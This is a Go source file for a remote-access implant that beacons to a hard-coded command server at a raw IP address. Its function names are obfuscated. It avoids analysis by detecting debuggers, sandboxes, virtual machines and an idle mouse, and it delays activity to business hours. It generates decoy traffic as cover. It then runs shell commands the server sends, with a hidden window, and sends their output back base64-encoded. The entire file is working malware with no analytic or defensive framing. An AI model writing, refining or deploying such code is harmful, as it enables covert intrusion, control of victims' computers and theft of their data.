package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	SERVER_URL     = "https://37.27.249.191:7443"
	SERVER_PWD     = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
	USER_AGENT_STR = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
	MUTEX_STR      = "Global\ServiceHostPdsUXaZbEYEsQqHlr"
)

var (
	k32 = syscall.NewLazyDLL("kernel32.dll")
	u32 = syscall.NewLazyDLL("user32.dll")
	
	pIsDebuggerPresent = k32.NewProc("IsDebuggerPresent")
	pGetCursorPos      = u32.NewProc("GetCursorPos")
	pCreateMutexW      = k32.NewProc("CreateMutexW")
	pGetSystemMetrics  = u32.NewProc("GetSystemMetrics")
)

type PaIwfDDJMlXZd struct {
	Action    string                 `json:"action"`
	UUID      string                 `json:"uuid"`
	User      string                 `json:"user"`
	Host      string                 `json:"host"`
	PID       int                    `json:"pid"`
	OS        string                 `json:"os"`
	Timestamp string                 `json:"timestamp"`
	IPs       []string               `json:"ips"`
	Payload   map[string]interface{} `json:"payload_os"`
}

type PyFadqjhmrD struct {
	Action     string `json:"action"`
	TaskID     string `json:"task_id"`
	UserOutput string `json:"user_output"`
	Completed  bool   `json:"completed"`
}

type Point struct {
	X, Y int32
}

func PIlhYOusgpnaIorMh() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	
	ret, _, _ := pIsDebuggerPresent.Call()
	if ret != 0 {
		return true
	}
	
	hostileProcesses := []string{
		"ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
		"regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
		"sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
	}
	
	for _, proc := range hostileProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
		if output, err := cmd.Output(); err == nil {
			if strings.Contains(strings.ToLower(string(output)), proc) {
				return true
			}
		}
	}
	
	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
	if output, err := cmd.Output(); err == nil {
		manufacturer := strings.ToLower(string(output))
		vmStrings := []string{"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", "microsoft corporation", "innotek"}
		for _, vm := range vmStrings {
			if strings.Contains(manufacturer, vm) {
				return true
			}
		}
	}
	
	width, _, _ := pGetSystemMetrics.Call(0)
	height, _, _ := pGetSystemMetrics.Call(1)
	if width < 1024 || height < 768 {
		return true
	}
	
	return false
}

func PPrIigAVIJAHNihUWaZ() bool {
	var pos1, pos2 Point
	
	pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
	time.Sleep(150 * time.Millisecond)
	pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
	
	if pos1.X == pos2.X && pos1.Y == pos2.Y {
		time.Sleep(2 * time.Second)
		var pos3 Point
		pGetCursorPos.Call(uintptr(unsafe.Pointer(&pos3)))
		return pos2.X != pos3.X || pos2.Y != pos3.Y
	}
	
	return true
}

func PqWpvcMnkbWthVmlxvTOx() bool {
	now := time.Now()
	hour := now.Hour()
	weekday := now.Weekday()
	
	if weekday == time.Saturday || weekday == time.Sunday {
		return false
	}
	
	return hour >= 9 && hour <= 17
}

func PxrTUxjYvnFoXki() error {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("%d-%s", time.Now().Unix(), hostname)
	
	payload := PaIwfDDJMlXZd{
		Action:    "checkin",
		UUID:      uuid,
		User:      os.Getenv("USERNAME"),
		Host:      hostname,
		PID:       os.Getpid(),
		OS:        runtime.GOOS,
		Timestamp: time.Now().Format(time.RFC3339),
		IPs:       []string{"127.0.0.1"},
		Payload: map[string]interface{}{
			"os":   runtime.GOOS,
			"arch": runtime.GOARCH,
		},
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", SERVER_URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", USER_AGENT_STR)
	req.Header.Set("Mythic", SERVER_PWD)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func PtcTHBwRfRbDDrNGO() ([]map[string]interface{}, error) {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("GET", SERVER_URL+"/api/v1.4/agent_message", nil)
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("User-Agent", USER_AGENT_STR)
	req.Header.Set("Mythic", SERVER_PWD)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	var tasks []map[string]interface{}
	json.Unmarshal(body, &tasks)
	
	return tasks, nil
}

func PMRnskUnKvMeNVufzCq(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Error: %s", err.Error())
	}
	
	return string(output)
}

func PCkKZeqbiOrMuBFhozaVc(taskID, output string) error {
	response := PyFadqjhmrD{
		Action:     "post_response",
		TaskID:     taskID,
		UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
		Completed:  true,
	}
	
	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", SERVER_URL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", USER_AGENT_STR)
	req.Header.Set("Mythic", SERVER_PWD)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

func PXTJtUSnEHdwuSByZzlBiYk() {
	go func() {
		for {
			sleepTime := time.Duration(300+time.Now().Unix()%600) * time.Second
			time.Sleep(sleepTime)
			
			activities := []func(){
				func() { exec.Command("nslookup", "microsoft.com").Run() },
				func() { exec.Command("ping", "-n", "1", "8.8.8.8").Run() },
				func() {
					if f, err := os.Create(os.TempDir() + "\temp_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"); err == nil {
						f.Write([]byte("temporary system data"))
						f.Close()
						time.Sleep(5 * time.Second)
						os.Remove(f.Name())
					}
				},
			}
			
			if len(activities) > 0 {
				activities[time.Now().Unix()%int64(len(activities))]()
			}
		}
	}()
}

func main() {
	if PIlhYOusgpnaIorMh() {
		os.Exit(0)
	}
	
	if !PPrIigAVIJAHNihUWaZ() {
		time.Sleep(10 * time.Second)
		if !PPrIigAVIJAHNihUWaZ() {
			os.Exit(0)
		}
	}
	
	if !PqWpvcMnkbWthVmlxvTOx() {
		now := time.Now()
		nextBusiness := now
		
		for nextBusiness.Weekday() == time.Saturday || 
			nextBusiness.Weekday() == time.Sunday || 
			nextBusiness.Hour() < 9 || 
			nextBusiness.Hour() >= 17 {
			nextBusiness = nextBusiness.Add(1 * time.Hour)
		}
		
		time.Sleep(nextBusiness.Sub(now))
	}
	
	mutexName, _ := syscall.UTF16PtrFromString(MUTEX_STR)
	mutex, _, _ := pCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexName)))
	if mutex == 0 {
		os.Exit(0)
	}
	
	PXTJtUSnEHdwuSByZzlBiYk()
	
	err := PxrTUxjYvnFoXki()
	if err != nil {
		time.Sleep(60 * time.Second)
		os.Exit(0)
	}
	
	for {
		tasks, err := PtcTHBwRfRbDDrNGO()
		if err == nil && len(tasks) > 0 {
			for _, task := range tasks {
				if taskID, ok := task["id"].(string); ok {
					if command, ok := task["command"].(string); ok {
						output := PMRnskUnKvMeNVufzCq(command)
						PCkKZeqbiOrMuBFhozaVc(taskID, output)
					}
				}
			}
		}
		
		now := time.Now()
		var jitter time.Duration
		
		if now.Hour() >= 9 && now.Hour() <= 17 {
			jitter = time.Duration(3+time.Now().Unix()%7) * time.Second
		} else {
			jitter = time.Duration(10+time.Now().Unix()%20) * time.Second
		}
		
		time.Sleep(jitter)
	}
}
